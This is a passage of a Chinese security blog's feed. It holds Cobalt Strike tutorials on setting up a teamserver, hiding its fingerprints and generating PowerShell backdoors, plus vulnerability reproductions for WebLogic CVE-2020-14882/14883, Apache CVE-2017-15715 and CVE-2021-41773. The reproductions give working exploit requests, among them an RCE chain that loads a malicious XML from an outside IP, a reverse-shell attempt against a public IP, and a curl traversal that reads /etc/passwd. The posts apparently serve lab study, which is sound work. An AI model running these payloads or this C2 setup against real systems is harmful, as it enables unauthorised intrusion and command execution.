<ip>)去</li><li>4、SMB Beacon使用案例<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820205233195_8561.png"></li><li>使用psexec来登录，这里使用SMB Beacon listener、选着子Beacon<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605854_20200820205338313_20479.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605855_20200820205537939_5588.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605855_20200820205738422_11021.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605855_20200820205822871_31672.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;3-Cobaltstrike-Beacon与菜单栏、视图&quot;&gt;&lt;a href=&quot;#3-Cobaltstrike-Beacon与菜单栏、视图&quot; class=&quot;headerlink&quot; title=&quot;3.Cobaltstrike Beacon与菜单栏、视图&quot;&gt;&lt;/a&gt;3.</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://ta0ing.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CobaltStrike" scheme="http://ta0ing.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>2、Cobaltstrike Listener与Payload生成</title>
    <link href="http://ta0ing.github.io/article/b916b10c.html"/>
    <id>http://ta0ing.github.io/article/b916b10c.html</id>
    <published>2021-10-09T17:14:19.000Z</published>
    <updated>2021-10-09T17:19:50.842Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h2 id="2-Cobaltstrike-Listener与Payload生成"><a href="#2-Cobaltstrike-Listener与Payload生成" class="headerlink" title="2.Cobaltstrike Listener与Payload生成"></a>2.Cobaltstrike Listener与Payload生成</h2></li></ul><h3 id="一、Listener介绍"><a href="#一、Listener介绍" class="headerlink" title="一、Listener介绍"></a>一、Listener介绍</h3><ul><li>Listener(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象<br>当被监视的对象发生情况时,立即采取相应的行动。</li><li>在许多的渗透测试工具中，例如empire，metasploit，cobaltstrike中都有listener的存在。<br>大家可以简单地理解为listener就是用来接收目标主机权限的模块。</li></ul><h3 id="二、Listener创建"><a href="#二、Listener创建" class="headerlink" title="二、Listener创建"></a>二、Listener创建</h3><p>创建Listener的步骤：<br>Cobaltstrike–&gt;监听器<br>目前我是用的是Cobaltstrike4.0版本，其中内置了八个Listener</p><pre class="line-numbers language-none"><code class="language-none">1、wndows&#x2F;beacon_dns&#x2F;reverse_dns_txt2、windows&#x2F;beacon_http&#x2F;reverse_http3、windows&#x2F;beacon_https&#x2F;reverse_https4、windows&#x2F;beacon_bind_pipe5、windows&#x2F;beacon_tcp6、windows&#x2F;beacon_extc27、windows&#x2F;foreign&#x2F;reverse_http8、windows&#x2F;foreign&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>windows/beacon</strong>为内置监听器包括<strong>dns、http、https、smb、tcp、extc2六种方式的监听器</strong>；</li><li><strong>windows/foreign为外部监听器</strong></li></ul><p>beacon为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs。<br>foreign主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter,至于如何实现Cobaltstrike与MSF和Armitage的联动，<br>我们日后再讲。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605831_20200820171004832_18852.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605831_20200820171032405_13712.png"></p><h3 id="三、Cobaltstrike生成后门"><a href="#三、Cobaltstrike生成后门" class="headerlink" title="三、Cobaltstrike生成后门"></a>三、Cobaltstrike生成后门</h3><ul><li><p><strong>位置：:攻击–&gt;生成后门(标红为常用)</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605831_20200820172003278_28687.png"></p></li><li><p><strong>生成powshell木马进行上线(其他类型payload自行学习使用)</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605831_20200820172751877_18796.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605832_20200820172843581_20646.png"></p></li><li><p><strong>在目标主机命令行或powshell运行</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605832_20200820173046615_25292.png"></p></li><li><p><strong>主机上线….</strong></p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605832_20200820173118299_27983.png"></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;h2 id=&quot;2-Cobaltstrike-Listener与Payload生成&quot;&gt;&lt;a href=&quot;#2-Cobaltstrike-Listener与Payload生成&quot; class=&quot;headerlink&quot; title=&quot;2.Cobaltstrike Li</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://ta0ing.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CobaltStrike" scheme="http://ta0ing.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>1、Cobaltstrike 安装与简介</title>
    <link href="http://ta0ing.github.io/article/a8d93643.html"/>
    <id>http://ta0ing.github.io/article/a8d93643.html</id>
    <published>2021-10-09T17:10:48.000Z</published>
    <updated>2021-10-09T17:19:06.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Cobaltstrike-安装与简介"><a href="#1-Cobaltstrike-安装与简介" class="headerlink" title="1.Cobaltstrike 安装与简介"></a>1.Cobaltstrike 安装与简介</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><pre class="line-numbers language-none"><code class="language-none">Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人内称为CS.自去年起，Cobaltstrike升级到3.0版本，脱离了MSF框架后在国内安全圈大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socks代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。目前已是4.1版本项目官网:https:&#x2F;&#x2F;www.cobaltstrike.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、cobaltstike的架构"><a href="#二、cobaltstike的架构" class="headerlink" title="二、cobaltstike的架构"></a>二、cobaltstike的架构</h3><p>本人使用的是Cabaltstrike4.0版本，虽然官方已经更新到4.1版本，但是最近都在说有后门、因此不推荐使用<br>3.13版本文件架构如下。</p><p>│ Scripts 用户安装的插件<br>│ Log 每天的日志<br>│ c2lint 检查profile的错误异常<br>│ cobaltstrike<br>│ cobaltstrike.jar 客户端程序<br>│ icon.jpg LOGO<br>│ license.pdf 许可证文件<br>│ readme.txt<br>│ releasenotes.txt<br>│ teamserver 服务端程序<br>│ update<br>│ update.jar 更新程序<br>└─third-party 第三方工具，里面放的vnc d</p><h3 id="三、Cobaltstrike安装"><a href="#三、Cobaltstrike安装" class="headerlink" title="三、Cobaltstrike安装"></a>三、Cobaltstrike安装</h3><ul><li>1、Linux环境配置示例(需提前安装好Java与JDK)：推荐使用ubantu16.4<pre class="line-numbers language-none"><code class="language-none">安装java jdk:sudo apt-get update   #更新软件包列表sudo apt-get install openjdk-8-jdk   #安装openjdk-8-jdkjava -version  #查看java版本apt-get install screen     #screen后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605839_20200820153105091_21017.png"></li><li>2、上传Cobaltstrike程序至服务器</li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820153633259_478.png"></p><ul><li>3、服务端搭建</li></ul><pre class="line-numbers language-none"><code class="language-none">cd cobaltstrike4.0   #进入cobaltstrike4.0目录ls    #查看目录下文件chmod + 777 teamserver    #将团队服务权限调制最高，或者执行权限。(这里是我懒直接777最高)vim teamserver  #进入进行修改端口以及指纹信息、更改cs的默认ssl证书信息也很重要不然凉犊子。防止0day，改了最好<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160335579_23479.png"></p><ul><li>4、运行</li></ul><pre class="line-numbers language-none"><code class="language-none">screen .&#x2F;teamserver ip 密码         #第一种在linux在后台运行nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推荐<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160416500_31271.png"><br>windows运行start.bat即可<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160606921_6852.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160529056_1736.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160634813_7205.png"><br>工具地址：<a href="https://pan.baidu.com/s/1BA61luBY6mktNf7DFzzMhg">https://pan.baidu.com/s/1BA61luBY6mktNf7DFzzMhg</a> 提取码：qwer</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Cobaltstrike-安装与简介&quot;&gt;&lt;a href=&quot;#1-Cobaltstrike-安装与简介&quot; class=&quot;headerlink&quot; title=&quot;1.Cobaltstrike 安装与简介&quot;&gt;&lt;/a&gt;1.Cobaltstrike 安装与简介&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://ta0ing.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CobaltStrike" scheme="http://ta0ing.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020【14750,14882,14883】weblogic未授权命令执行复现</title>
    <link href="http://ta0ing.github.io/article/a1981ad3.html"/>
    <id>http://ta0ing.github.io/article/a1981ad3.html</id>
    <published>2021-10-09T08:15:50.000Z</published>
    <updated>2021-10-09T16:11:34.387Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre class="line-numbers language-none"><code class="language-none">Oracle Weblogic Server 10.3.6.0.0Oracle Weblogic Server 12.1.3.0.0Oracle Weblogic Server 12.2.1.3.0Oracle Weblogic Server 12.2.1.4.0Oracle Weblogic Server 14.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次测试版本WebLogic12.2.1.4<br>下载地址：<br><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607251_20201030221957753_18260.png"><br>Java版本：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607251_20201030224810393_9486.png"><br>需要用管理员权限运行<br><code>java -jar fmw_12.2.1.4.0_wls_lite_generic.jar</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030230430097_15519.png"><br>默认下一步，选择含示列的完整安装<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030230552878_22117.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607252_20201030231039244_20374.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231512877_6310.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231528165_18174.png"><br>访问<br><code>http://Your ip:7001/console</code><br>出现登录页面即成功安装<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030231706187_26897.png"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-14750-权限绕过漏洞"><a href="#CVE-2020-14750-权限绕过漏洞" class="headerlink" title="CVE-2020-14750: 权限绕过漏洞"></a>CVE-2020-14750: 权限绕过漏洞</h4><p>远程攻击者可以构造特殊的 HTTP 请求，在未经身份验证的情况下接管 WebLogic Server Console ，从而执行任意代码。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP:7001&#x2F;console&#x2F;images&#x2F;%252E.&#x2F;console.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="CVE-2020-14883-权限绕过漏洞"><a href="#CVE-2020-14883-权限绕过漏洞" class="headerlink" title="CVE-2020-14883: 权限绕过漏洞"></a>CVE-2020-14883: 权限绕过漏洞</h4><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。<br>权限绕过漏洞（CVE-2020-14882），访问以下URL，未授权访问到管理后台页面（低权限的用户）：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2722623180160.png"></p><center>发现我们现在是低权限的用户，无法安装应用,所以组合下面的CVE-2020-14882 可以继续利用</center><hr><h4 id="CVE-2020-14882-代码执行漏洞"><a href="#CVE-2020-14882-代码执行漏洞" class="headerlink" title="CVE-2020-14882: 代码执行漏洞"></a>CVE-2020-14882: 代码执行漏洞</h4><p>首先通过非法字符绕过访问，然后通过Gadget启动命令执行，poc如下</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP&#x2F;1.1Host: 192.168.3.189:7001User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflateConnection: closeCookie: ADMUpgrade-Insecure-Requests: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201030232437984_680.png"><br>可以发现弹出计算器了<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607253_20201030232257621_24179.png"><br>修复建议<br>下载最新补丁<br>Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com后,可以下载最新补丁./">https://support.oracle.com后，可以下载最新补丁。</a></p><hr><h2 id="linux下Weblogic-CVE-2020-14882，CVE-2020-14883"><a href="#linux下Weblogic-CVE-2020-14882，CVE-2020-14883" class="headerlink" title="linux下Weblogic(CVE-2020-14882，CVE-2020-14883)"></a>linux下Weblogic(CVE-2020-14882，CVE-2020-14883)</h2><p>  Weblogic是Oracle公司推出的J2EE应用服务器。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全代表@voidfyoo提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。</p><p>  CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个细分组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用vulhub<code>docker-compose up -d</code><br>启动完成后，访问<a href="http://your-ip:7001/console%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E5%88%B0%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:7001/console即可查看到后台登录页面。</a></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先测试权限绕过突破（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：<br><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103154530307_25132.png"><br>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103154625824_20719.png"><br>此时需要利用到第二个突破CVE-2020-14883。这个突破的利用方式有两种：<br>一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code><br>二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code><br>直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20&#x2F;tmp&#x2F;success1&#39;);&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器，可以发现touch /tmp/success1已成功执行：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103155601050_1486.png"><br>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。<br><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最初在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p><strong>首先，我们需要构造一个XML文件，将其保存在Weblogic可以访问到的服务器上，如<a href="http://8.210.235.249/RCE.xml%EF%BC%9A">http://8.210.235.249/RCE.xml：</a></strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>   <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>   <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[touch /tmp/success2]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;8.210.235.249&#x2F;RCE.xml&quot;)&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以使用python启动一起web服务(高效，快速，直观)<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607254_20201103160222148_3626.png"><br>加载恶意xml成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607255_20201103160351700_16604.png"><br>这个利用方法也有自己的缺点，就是需要Weblogic的服务器能够访问到恶意XML。</p><hr><h3 id="反弹shell的一些坑"><a href="#反弹shell的一些坑" class="headerlink" title="反弹shell的一些坑"></a>反弹shell的一些坑</h3><p>Linux反弹shell方法：使用加载恶意xml反弹shell<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607276_20201103161545603_3774.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;106.75.229.39:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http:&#x2F;&#x2F;your-ip&#x2F;RCE.xml%22)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607607276_20201103163050170_8883.png"></p><p>windows暂时没成功，很多大佬说的回显我也没成功。</p><p>参考：<br><code>https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg</code><br><code>https://blog.csdn.net/HezhezhiyuLe/article/details/95960479</code><br><code>https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h3&gt;&lt;p&gt;WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLo</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="weblogic" scheme="http://ta0ing.github.io/tags/weblogic/"/>
    
    <category term="CVE-2020-14750" scheme="http://ta0ing.github.io/tags/CVE-2020-14750/"/>
    
    <category term="CVE-2020-14882" scheme="http://ta0ing.github.io/tags/CVE-2020-14882/"/>
    
    <category term="CVE-2020-14883" scheme="http://ta0ing.github.io/tags/CVE-2020-14883/"/>
    
  </entry>
  
  <entry>
    <title>apache 解析漏洞（CVE-2017-15715)</title>
    <link href="http://ta0ing.github.io/article/1c1cce96.html"/>
    <id>http://ta0ing.github.io/article/1c1cce96.html</id>
    <published>2021-10-09T07:38:38.000Z</published>
    <updated>2021-10-09T16:11:34.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>使用Vulhub</p><h3 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h3><p>上传一个名为six.php的文件，被拦截：<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200907160230876_29113.png" alt="img"><br><strong>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：</strong><br>修改后</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100228730_20905.png" alt="img"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606482_20200908100418532_11097.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2017-15715&quot;&gt;&lt;a href=&quot;#CVE-2017-15715&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-15715&quot;&gt;&lt;/a&gt;CVE-2017-15715&lt;/h2&gt;&lt;h3 id=&quot;一、漏洞描述&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache HTTPD" scheme="http://ta0ing.github.io/tags/Apache-HTTPD/"/>
    
    <category term="CVE-2017-15715" scheme="http://ta0ing.github.io/tags/CVE-2017-15715/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</title>
    <link href="http://ta0ing.github.io/article/3ec89881.html"/>
    <id>http://ta0ing.github.io/article/3ec89881.html</id>
    <published>2021-10-09T07:10:40.000Z</published>
    <updated>2021-10-09T16:11:34.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p><strong>参考链接：</strong></p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li><li><a href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li><li><a href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd 